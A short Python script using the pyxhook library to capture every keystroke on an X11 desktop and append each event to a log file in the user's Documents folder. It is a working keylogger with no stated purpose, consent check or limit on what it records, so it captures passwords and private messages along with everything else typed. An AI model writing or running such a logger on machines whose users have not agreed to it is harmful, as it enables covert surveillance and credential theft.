import pyxhook
import os

log_file = os.environ.get('log_file', (os.path.expanduser('~/Documents/file.log')))

def OnKeyPress(event):
    with open(log_file,'a') as f:
        f.write('{}\n'.format(str(event),'ascii'))


hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress

hook.HookKeyboard()

try:
    hook.start()
except KeyboardInterrupt:
    pass

#except Exception as ex:
#    msg = 'Error while catching events :\n {}'.format(ex)

